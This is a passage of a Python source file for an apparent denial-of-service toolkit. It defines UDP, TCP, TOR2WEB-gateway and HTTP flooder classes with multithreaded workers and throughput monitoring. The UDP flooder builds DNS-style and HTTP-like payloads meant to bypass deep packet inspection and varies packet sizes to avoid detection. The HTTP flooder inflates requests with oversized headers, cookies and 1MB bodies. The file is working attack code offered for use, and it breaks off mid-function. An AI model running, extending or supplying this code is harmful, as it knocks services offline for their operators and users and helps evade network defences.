import random
import struct
import threading
import time
import os
import socket
import queue
import logging
import shutil
from typing import List, Dict, Optional
from contextlib import contextmanager
from .utilities import AttackModule, UI, Style

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class AttackModule:
    def __init__(self, targets: List[str], ports: List[int], skip_prompt: bool = False):
        self.targets = targets
        self.ports = ports
        self.running = False
        self.thread_list = []
        self.start_time = 0
        self.skip_prompt = skip_prompt
        self.logger = logging.getLogger(self.__class__.__name__)
        
        # Add thread-safe stats
        self._stats_lock = threading.Lock()
        self._stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }

    @property
    def stats(self):
        with self._stats_lock:
            return self._stats.copy()

    def increment_stat(self, key: str, value: int = 1):
        with self._stats_lock:
            self._stats[key] += value

    def monitor_performance(self):
        """Monitor and adjust performance parameters in real-time"""
        last_update = time.time()
        last_stats = self.stats
        status_counter = 0
        max_status_lines = 20  # Maximum number of status lines to show
        
        while self.running:
            try:
                time.sleep(0.1)  # More frequent updates
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats
                    
                    # Calculate rates
                    pps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024)
                    
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Format status line with fixed components
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_components = [
                        f"[{timestamp}]",
                        f"Target: {self.targets[0]}",
                        f"Port: {self.ports[0]}",
                        f"Method: {self.__class__.__name__.upper()}",
                        f"PPS: {pps:.2f}",
                        f"BPS: {mbps:.2f} MB",
                        f"Success Rate: {success_rate}%"
                    ]
                    
                    # Join components with separator
                    status_line = " | ".join(status_components)
                    
                    # Print status line without clearing previous ones
                    print(status_line)
                    status_counter += 1
                    
                    # If we've shown too many lines, add a separator
                    if status_counter >= max_status_lines:
                        print("-" * len(status_line))
                        status_counter = 0
                    
                    # Update tracking values
                    last_stats = current_stats
                    last_update = current_time
                    
            except Exception as e:
                self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)

    @contextmanager
    def create_socket(self, socket_type=socket.SOCK_DGRAM):
        """Context manager for socket creation and cleanup"""
        sock = socket.socket(socket.AF_INET, socket_type)
        try:
            yield sock
        finally:
            try:
                sock.close()
            except:
                pass

    def check_targets_online(self):
        """Verify targets are responsive before starting attack"""
        offline_targets = []
        for target in self.targets:
            try:
                # Quick TCP connection test to check if host is up
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    if s.connect_ex((target, self.ports[0])) != 0:
                        offline_targets.append(target)
            except socket.error:
                offline_targets.append(target)
        return offline_targets

    def start(self):
        """Base start method for all attack modules"""
        if not self.targets or not self.ports:
            raise ValueError("No targets or ports specified")

        # Check for offline targets
        offline_targets = self.check_targets_online()
        if offline_targets:
            for target in offline_targets:
                self.logger.warning(f"Target {target} appears to be offline")
            
            # Skip confirmation if -y flag is used
            if not self.skip_prompt:
                if input("Continue anyway? (y/n): ").lower() != 'y':
                    raise RuntimeError("Operation cancelled - offline targets detected")
            else:
                self.logger.info("Skipping confirmation due to -y flag, continuing with offline targets")

        self.running = True
        self.start_time = time.time()
        self.thread_list = []

    def stop(self):
        """Base stop method for all attack modules"""
        self.running = False
        
        # Wait for all threads to finish
        for thread in self.thread_list:
            try:
                thread.join(timeout=2)
            except Exception as e:
                self.logger.debug(f"Error stopping thread: {e}")

class UDPFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], packet_size: int = 30720,  # Changed default
                 duration: int = 60, threads: int = 5, debug: bool = False, proxy_manager=None, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.packet_size = packet_size  # Remove artificial limit
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.aggressive_mode = True  # Enable aggressive mode by default
        self.proxy_manager = proxy_manager
        self.dns_domains = [
            'google.com', 'facebook.com', 'youtube.com', 'amazon.com', 
            'cloudflare.com', 'microsoft.com', 'apple.com', 'netflix.com',
            'twitter.com', 'instagram.com', 'linkedin.com', 'github.com',
            'ovh.com', 'ovh.net', 'ovhcloud.com'  # Added OVH domains
        ]
        
        # Performance optimization settings
        self.sockets_per_thread = 32  # Increased from 8
        self.packet_cache_size = 250  # Increased from 100
        self.target_bandwidth = 50 * 1024 * 1024  # Increased to 50 MB/s target
        
        # Socket pool management
        self.socket_pools = [{} for _ in range(self.sockets_per_thread)]
        self.socket_pool_locks = [threading.Lock() for _ in range(self.sockets_per_thread)]
        
        # Advanced timing and burst control
        self.burst_size = 5000  # Increased from 1000
        self.min_burst_interval = 0.0001  # Decreased for higher throughput
        self.adaptive_timing = True
        
        # Add rate limiting - but with higher limits
        self.packets_per_second = self.target_bandwidth / self.packet_size
        self.interval = 1.0 / self.packets_per_second
        
        # Packet generation optimization
        self.use_memory_efficient_payloads = True
        self.precomputed_payload_sizes = [1024, 2048, 4096, 8192, 16384, 30720, 61440]  # Added larger sizes
        
        self.payload_pool = {}
        self.payload_pool_lock = threading.Lock()
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Initialize payload pool
        self.initialize_payload_pool()
        
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: UDPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        self.status_length = len(self.status_format.format(
            timestamp="00:00:00",
            target="000.000.000.000",
            port="00000",
            pps=0.0,
            mbps=0.0,
            rate=100
        ))
        
        if debug:
            self.logger.setLevel(logging.DEBUG)
    
    def initialize_payload_pool(self):
        """Pre-generate payload patterns for various ports and sizes"""
        UI.print_info("Initializing optimized payload pool...")
        
        # For each port type, generate pattern templates
        self.payload_templates = {}
        
        # DNS payload templates (port 53)
        self.payload_templates[53] = []
        for _ in range(20):  # Increased from 10 to 20 different DNS query templates
            transaction_id = random.randint(0, 65535)
            flags = random.choice([0x0100, 0x8000, 0x8180, 0x8580])
            qdcount = random.randint(1, 5)  # Increased max queries
            ancount = random.randint(0, 3)  # Increased max answers
            nscount = random.randint(0, 3)  # Increased max name servers
            arcount = random.randint(0, 3)  # Increased max additional records
            
            # Create the DNS header
            header = struct.pack('!HHHHHH',
                transaction_id,
                flags,
                qdcount,
                ancount,
                nscount,
                arcount
            )
            
            # Generate a domain template with more randomness
            domain_template = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-', k=12)) + '.' + random.choice(self.dns_domains)
            
            self.payload_templates[53].append({
                'header': header,
                'domain_template': domain_template,
                'qdcount': qdcount
            })
        
        # Generate generic payload patterns for other ports with more variety
        self.payload_patterns = {}
        for size in self.precomputed_payload_sizes:
            # Create different pattern types
            self.payload_patterns[size] = []
            
            # Add more pattern variations (10 instead of 3)
            # 1. Completely random binary data
            for _ in range(3):
                self.payload_patterns[size].append(random.randbytes(size))
            
            # 2. Repeating patterns with different chunk sizes
            for chunk_size in [16, 32, 64]:
                if chunk_size < size:
                    pattern = random.randbytes(chunk_size)
                    repeated = pattern * (size // len(pattern) + 1)
                    self.payload_patterns[size].append(repeated[:size])
            
            # 3. ASCII printable characters
            for _ in range(2):
                ascii_pattern = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)).encode()
                self.payload_patterns[size].append(ascii_pattern[:size])
            
            # 4. HTTP-like patterns to bypass DPI
            if size >= 64:
                http_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
                http_method = random.choice(http_methods)
                http_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                http_host = random.choice(['example.com', 'google.com', 'cloudflare.com', 'akamai.net'])
                http_req = f"{http_method} {http_path} HTTP/1.1\r\nHost: {http_host}\r\n\r\n".encode()
                
                # Pad to desired size
                if len(http_req) < size:
                    padding = random.randbytes(size - len(http_req))
                    http_req += padding
                
                self.payload_patterns[size].append(http_req[:size])
        
    def get_optimized_payload(self, port: int, size: Optional[int] = None) -> bytes:
        """Get an optimized payload for the given port and size"""
        if size is None:
            size = random.choice(self.precomputed_payload_sizes)
            if size > self.packet_size:
                size = self.packet_size
        
        # For DNS port, generate specialized DNS query
        if port == 53:
            template = random.choice(self.payload_templates[53])
            header = template['header']
            
            # Generate a unique subdomain
            prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
            domain = template['domain_template'].replace('abcdefgh', prefix)
            
            # Build question section with multiple queries
            questions = b''
            for _ in range(template['qdcount']):
                question = b''
                parts = domain.split('.')
                for part in parts:
                    encoded_part = part.encode('ascii')
                    question += struct.pack('B', len(encoded_part)) + encoded_part
                question += b'\x00'
                
                # Randomize query types for variety
                qtype = random.choice([1, 28, 33, 255])
                question += struct.pack('!HH', qtype, 1)  # QTYPE and QCLASS
                questions += question
            
            # Combine header and questions
            dns_query = header + questions
            
            # Add padding with random data to reach desired size
            if len(dns_query) < size:
                padding_size = size - len(dns_query)
                padding = random.randbytes(padding_size)
                dns_query += padding
            
            return dns_query
        
        # For other ports, use optimized pattern
        else:
            # Find the closest size in our precomputed patterns
            closest_size = min(self.precomputed_payload_sizes, key=lambda x: abs(x - size))
            
            # Get a random pattern of that size
            pattern = random.choice(self.payload_patterns[closest_size])
            
            # If exact size match, return as is
            if len(pattern) == size:
                return pattern
            
            # Otherwise, truncate or pad
            if len(pattern) > size:
                return pattern[:size]
            else:
                padding = random.randbytes(size - len(pattern))
                return pattern + padding
    
    def get_socket(self, target, port, pool_index=0):
        """Get or create a socket for the target:port combination from specified pool"""
        key = f"{target}:{port}"
        
        with self.socket_pool_locks[pool_index]:
            if key not in self.socket_pools[pool_index]:
                with self.create_socket() as sock:
                    # Enhanced socket configuration with larger buffer sizes
                    try:
                        # Set larger buffer sizes for higher throughput
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024 * 1024)
                        
                        # Try to set priority, but don't fail if not root
                        try:
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 7)
                        except PermissionError:
                            if self.debug:
                                self.logger.debug("Cannot set socket priority - requires root privileges")
                        
                        # Address reuse and port reuse
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        if hasattr(socket, 'SO_REUSEPORT'):  # Linux systems
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                        
                        # Try to disable UDP checksum, but don't fail if not supported
                        if hasattr(socket, 'UDP_CHECKSUM_COVERAGE'):  # Linux systems
                            try:
                                sock.setsockopt(socket.SOL_UDP, socket.UDP_CHECKSUM_COVERAGE, 0)
                            except (PermissionError, AttributeError):
                                if self.debug:
                                    self.logger.debug("Cannot disable UDP checksum - requires root privileges")
                        
                        # For performance, set non-blocking mode
                        sock.setblocking(False)
                    except Exception as e:
                        self.logger.debug(f"Socket option error: {e}")
                        raise
                
                    # If using proxies, try to bind to a proxy
                    if self.proxy_manager:
                        proxy = self.proxy_manager.get_proxy()
                        if proxy:
                            try:
                                proxy_ip, proxy_port = proxy.split(':')
                                sock.bind((proxy_ip, int(proxy_port)))
                                if self.debug:
                                    UI.print_info(f"Using proxy {proxy} for {target}:{port}")
                            except Exception as e:
                                if self.debug:
                                    UI.print_error(f"Failed to use proxy {proxy}: {e}")
                    
                    # For DNS ports, try to use random source ports (if running as root)
                    if port == 53:
                        try:
                            if os.geteuid() == 0:  # Running as root
                                random_port = random.randint(1024, 65000)
                                sock.bind(('0.0.0.0', random_port))
                        except (AttributeError, OSError):
                            pass
                    
                    self.socket_pools[pool_index][key] = sock
            
            return self.socket_pools[pool_index][key]
    
    def flood_target(self, target: str, port: int):
        """Worker function that sends UDP packets with optimized performance"""
        self.logger.debug(f"Starting flood worker for {target}:{port}")
        # Create multiple sockets for this worker
        sockets = [self.get_socket(target, port, i % self.sockets_per_thread) for i in range(self.sockets_per_thread)]
        
        # Pre-generate larger payload cache with varied sizes for unpredictability
        payloads = []
        for _ in range(self.packet_cache_size):
            # Vary packet sizes to avoid pattern detection
            size = random.choice(self.precomputed_payload_sizes)
            payloads.append(self.get_optimized_payload(port, size))
        
        payload_index = 0
        
        # Calculate burst parameters based on target bandwidth
        target_pps = self.target_bandwidth / self.packet_size
        packets_per_burst = min(self.burst_size, max(1000, int(target_pps * 0.5)))  # Increased from 0.2
        
        # Adaptive timing parameters
        last_burst_time = time.time()
        socket_index = 0
        success_count = 0
        failure_count = 0
        
        # Batch sending setup - increased for higher throughput
        max_batch_size = 256  # Increased from 128
        current_batch = 0
        
        # For DNS attacks, we want different subdomains each time
        if port == 53:
            dns_refresh_counter = 0
        
        last_packet_time = time.time() - 0.1  # Start with a slight offset to send immediately
        
        while self.running:
            try:
                # Batch sending for higher throughput
                for _ in range(max_batch_size):
                    # Send one packet
                    sock = sockets[socket_index]
                    socket_index = (socket_index + 1) % len(sockets)
                    
                    payload = payloads[payload_index]
                    payload_index = (payload_index + 1) % len(payloads)
                    
                    try:
                        sock.sendto(payload, (target, port))
                        success_count += 1
                        self.increment_stat("packets_sent")
                        self.increment_stat("bytes_sent", len(payload))
                        self.increment_stat("successful")
                    except (socket.error, OSError):
                        failure_count += 1
                        self.increment_stat("failures")
                        
                        # Recreate socket on failure
                        try:
                            sockets[socket_index] = self.get_socket(target, port, socket_index % self.sockets_per_thread)
                        except:
                            pass
                
                # Minimal sleep between batches to prevent CPU overload
                time.sleep(0.0001)
                    
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Error in flood_target: {str(e)}")
                time.sleep(0.0005)  # Reduced sleep time on error
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def start(self):
        """Start the UDP flood operation"""
        super().start()
        
        UI.print_header("UDP Flood Operation")
        UI.print_info(f"Starting UDP flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Packet size: {self.packet_size:,} bytes")
        print(f"- Threads per target/port: {self.threads} (with {self.sockets_per_thread} sockets each)")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Aggressive mode: {'Enabled' if self.aggressive_mode else 'Disabled'}")
        print(f"- Target bandwidth: {self.target_bandwidth/(1024*1024):.0f} MB/s")
        
        # Special handling for DNS ports
        if 53 in self.ports:
            UI.print_info("DNS port (53) detected - Using enhanced DNS attack techniques")
            
            # Check if running as root/admin for raw socket access
            try:
                is_root = os.geteuid() == 0
            except AttributeError:
                # Windows or other OS without geteuid()
                is_root = False
            
            if is_root:
                UI.print_success("Running as root - full UDP flooding capabilities enabled")
            else:
                UI.print_warning("Not running as root - some DNS flooding capabilities will be limited")
                UI.print_info("For maximum DNS flooding effectiveness, run with sudo")
        
        # Show estimated packet rate based on threads
        est_pps = self.threads * len(self.targets) * len(self.ports) * 100  # Estimate 100 pps per thread
        UI.print_info(f"Estimated packet rate: ~{est_pps:,} packets/second")
        
        # Start worker threads for each target and port
        total_threads = len(self.targets) * len(self.ports) * self.threads
        
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_target, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    # Show progress every 10 threads
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads, 
                                           prefix=f"Threads: {thread_count}/{total_threads}", 
                                           length=30)
        
        # Start only the performance monitoring thread
        perf_thread = threading.Thread(target=self.monitor_performance)
        perf_thread.daemon = False  # Changed to non-daemon
        perf_thread.start()
        
        # Run for specified duration
        try:
            UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        
        # Stop operation
        self.stop()
        
        # Print final summary
        elapsed = time.time() - self.start_time
        mbps = (self.stats["bytes_sent"] * 8) / (elapsed * 1000 * 1000) if elapsed > 0 else 0
        pps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total packets sent: {self.stats['packets_sent']:,}")
        print(f"- Failed packets: {self.stats['failures']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Average speed: {mbps:.2f} Mbps ({pps:.0f} packets/sec)")
        print(f"- Peak performance: {self.perf_data['highest_mbps']:.2f} Mbps ({self.perf_data['highest_pps']:.0f} packets/sec)")

class TCPFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], packet_size: int = 30720,  # Changed default
                 duration: int = 60, threads: int = 5, debug: bool = False, 
                 proxy_manager=None, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.packet_size = packet_size
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        
        # Enhanced performance settings
        self.sockets_per_thread = 512  # Increased from 256
        self.connection_timeout = 0.5  # Reduced timeout for faster retries
        self.max_failures_per_target = 10000  # Increased
        self.reconnect_delay = 0.001  # Reduced delay
        self.send_buffer_size = 65536  # Increased buffer size
        # Update packet sizes for more aggressive sending
        self.packet_sizes = [
            self.packet_size,         # Base size (30KB)
            self.packet_size * 2,     # Double (60KB)
            self.packet_size * 4      # Quad (120KB)
        ]
        self.aggressive_mode = True
        self.retry_count = 5  # Increased retries
        self.backoff_delay = 0.1  # Reduced backoff
        self.last_stat_update = time.time()
        self.stat_update_interval = 1.0
        
        # Pre-generate payloads
        self.payload_cache = [os.urandom(size) for size in self.packet_sizes]
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0,
            "bytes_sent": 0
        }
        self._monitor_thread = None
        
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: TCPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        self.status_length = len(self.status_format.format(
            timestamp="00:00:00",
            target="000.000.000.000",
            port="00000",
            pps=0.0,
            mbps=0.0,
            rate=100
        ))

        if debug:
            self.logger.setLevel(logging.DEBUG)

    def start(self):
        """Start TCP flood operation"""
        super().start()
        
        UI.print_header("TCP Flood Operation")
        UI.print_info(f"Starting TCP flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        # Configuration info
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Sockets per thread: {self.sockets_per_thread}")
        
        # Launch threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_target, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        # Start only the performance monitoring thread
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = False  # Changed to non-daemon
        self._monitor_thread.start()
        
        # Run for duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            self._print_final_stats()

    def stop(self):
        """Stop the operation gracefully"""
        if not self.running:
            return
            
        self.running = False
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=2)
            except Exception:
                pass

        # Cleanup all sockets
        for thread in self.thread_list:
            try:
                if thread.is_alive():
                    thread.join(timeout=1)
            except Exception:
                pass

        print("\n")  # New line after status output

    def _print_final_stats(self):
        """Print final statistics"""
        elapsed = time.time() - self.start_time
        cps = self.stats["successful"] / elapsed if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total connections: {self.stats['successful']:,}")
        print(f"- Failed connections: {self.stats['failures']:,}")
        print(f"- Average rate: {cps:.0f} connections/sec")
        print(f"- Peak performance: {self.perf_data['highest_pps']:.0f} connections/sec")

    def flood_target(self, target: str, port: int):
        """Optimized TCP flood worker with retry logic"""
        self.logger.debug(f"Starting flood worker for {target}:{port}")
        sockets = []
        failures = 0
        retry_count = 0
        
        while self.running and failures < self.max_failures_per_target:
            try:
                # Create new socket with optimized settings
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.connection_timeout)
                
                # Enhanced socket options
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.send_buffer_size)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
                try:
                    # Attempt connection with retry logic
                    for attempt in range(self.retry_count):
                        try:
                            sock.connect((target, port))
                            # Connection successful
                            sockets.append(sock)
                            self.increment_stat("successful")
                            self.increment_stat("packets_sent")
                            retry_count = 0  # Reset retry counter on success
                            
                            # Send multiple payloads per connection
                            for _ in range(3):  # Send 3 payloads per connection
                                payload = random.choice(self.payload_cache)
                                sock.send(payload)
                                self.increment_stat("bytes_sent", len(payload))
                            break
                            
                        except (socket.timeout, ConnectionRefusedError) as e:
                            if attempt < self.retry_count - 1:
                                time.sleep(self.backoff_delay * (attempt + 1))
                                continue
                            raise
                    
                    # Maintain socket pool size
                    if len(sockets) > self.sockets_per_thread:
                        old_sock = sockets.pop(0)
                        try:
                            old_sock.shutdown(socket.SHUT_RDWR)
                            old_sock.close()
                        except:
                            pass
                            
                except Exception as e:
                    failures += 1
                    self.increment_stat("failures")
                    retry_count += 1
                    
                    if retry_count >= 5:  # Back off after 5 consecutive failures
                        time.sleep(self.backoff_delay)
                        retry_count = 0
                    
                    if self.debug and failures % 100 == 0:
                        UI.print_error(f"Connection failed to {target}:{port} - {str(e)}")
                    
                    try:
                        sock.close()
                    except:
                        pass
                    
                    continue
                
                # Brief pause between connection attempts
                time.sleep(self.reconnect_delay)
                
            except Exception as e:
                failures += 1
                self.increment_stat("failures")
                if self.debug:
                    UI.print_error(f"Socket creation failed: {str(e)}")
                time.sleep(self.reconnect_delay)
        
        # Cleanup
        for sock in sockets:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass

class TOR2WebFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
                 threads: int = 5, debug: bool = False, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        
        # TOR2WEB gateway list
        self.tor2web_gateways = [
            'onion.ws', 'onion.pet', 'onion.ly', 'onion.sh', 'onion.lu',
            'onion.cab', 'onion.city', 'onion.direct', 'onion.link',
            'onion.top', 'onion.si', 'onion.plus', 'onion.rip',
            'tor2web.org', 'tor2web.fi', 'tor2web.io', 'tor2web.xyz'
        ]
        
        # Connection settings
        self.timeout = 10
        self.max_retries = 3
        self.verify_ssl = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]

        if debug:
            self.logger.setLevel(logging.DEBUG)

    def get_tor2web_url(self, target: str, gateway: str) -> str:
        """Convert target to TOR2WEB URL format"""
        # Handle .onion addresses specially
        if '.onion' in target:
            return f"https://{target.replace('.onion', '')}.{gateway}"
        return f"https://{target}.{gateway}"

    def flood_worker(self, target: str, port: int):
        """Worker thread for TOR2WEB flooding"""
        import requests
        from requests.exceptions import RequestException
        
        session = requests.Session()
        session.verify = self.verify_ssl
        failures = 0
        
        while self.running:
            try:
                # Rotate through gateways
                gateway = random.choice(self.tor2web_gateways)
                url = self.get_tor2web_url(target, gateway)
                
                # Set random user agent
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                # Send request through TOR2WEB gateway
                response = session.get(
                    url,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Track successful requests
                if response.status_code:
                    self.increment_stat("successful")
                    self.increment_stat("bytes_sent", len(response.content))
                    
            except RequestException as e:
                failures += 1
                self.increment_stat("failures")
                if self.debug and failures % 100 == 0:
                    UI.print_error(f"TOR2WEB request failed: {str(e)}")
                time.sleep(0.1)

    def start(self):
        """Start TOR2WEB flood operation"""
        super().start()
        
        # Check dependencies
        try:
            import requests
        except ImportError:
            UI.print_error("Please install required package: pip install requests")
            return
        
        UI.print_header("TOR2WEB Flood Operation")
        UI.print_info(f"Starting TOR2WEB flood against {len(self.targets)} targets")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Available gateways: {len(self.tor2web_gateways)}")
        
        # Launch worker threads
        total_threads = len(self.targets) * self.threads
        UI.print_info(f"Launching {total_threads} TOR2WEB worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for _ in range(self.threads):
                thread = threading.Thread(target=self.flood_worker, args=(target, 80))
                thread.daemon = True
                thread.start()
                self.thread_list.append(thread)
                thread_count += 1
                
                if thread_count % 10 == 0 or thread_count == total_threads:
                    UI.print_progress_bar(thread_count, total_threads,
                                       prefix=f"Threads: {thread_count}/{total_threads}",
                                       length=30)
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.monitor_performance)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        
        self.stop()
        
        # Print summary
        elapsed = time.time() - self.start_time
        rps = self.stats["successful"] / elapsed if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total requests: {self.stats['successful']:,}")
        print(f"- Failed requests: {self.stats['failures']:,}")
        print(f"- Average rate: {rps:.0f} requests/sec")

class HTTPFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, 
                 skip_prompt: bool = False, method: str = 'GET', path: str = '/'):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        self.method = method.upper()
        self.path = path
        
        # Enhanced HTTP Settings
        self.timeout = 3  # Reduced from 5
        self.max_retries = 5  # Increased from 3
        self.connection_pool_size = 500  # Increased from 100
        self.keepalive = True
        self.chunk_size = 65536  # Increased from 8192
        self.verify_ssl = False  # Add this line
        
        # Generate larger payloads for POST
        self.post_data = {
            'data': 'X' * 1024 * 1024  # 1MB of data
        }
        
        # Add custom headers to increase payload size
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Custom-Data': 'X' * 8192,  # Add large custom header
            'Cookie': 'session=' + ('X' * 4096),  # Add large cookie
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        # Add query parameters to increase GET request size
        self.query_params = {
            'id': 'X' * 4096,
            'data': 'X' * 4096,
            'token': 'X' * 4096
        }
        
        # Performance monitoring
        self._monitor_thread = None
        self.perf_data = {
            "last_time": time.time(),
            "current_rps": 0,
            "highest_rps": 0,
            "total_requests": 0,
            "total_bytes": 0
        }

    def flood_worker(self, target: str, port: int):
        """Worker thread for HTTP flooding"""
        import requests
        from requests.exceptions import RequestException
        
        # Setup session with optimized settings
        session = requests.Session()
        session.verify = self.verify_ssl
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.connection_pool_size,
            pool_maxsize=self.connection_pool_size,
            max_retries=self.max_retries,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Determine protocol
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{target}:{port}{self.path}"
        
        while self.running:
            try:
                # Rotate user agent
                headers = self.headers.copy()
                headers['User-Agent'] = random.choice(self.user_agents)
                
                # Add timestamp to prevent caching
                params = self.query_params.copy()
                params['_'] = int(time.time() * 1000)
                
                # Send request based on method
                if self.method == 'GET':
                    response = session.get(
                        base_url,
                        headers=headers,
                        params=params,
                        timeout=self.timeout,
                        stream=True,
                        allow_redirects=True
                    )
                elif self.method == 'POST':
                    response = session.post(
                        base_url,
                        headers=headers,
                        data=self.post_data,
                        timeout=self.timeout,
                        stream=True,
                        allow_redirects=True
                    )
                else:  # HEAD
                    response = session.head(
                        base_url,
                        headers=headers,
                        timeout=self.timeout
                    )
                
                # Calculate total bytes sent
                sent_bytes = len(str(headers)) + len(str(params))
                if self.method == 'POST':
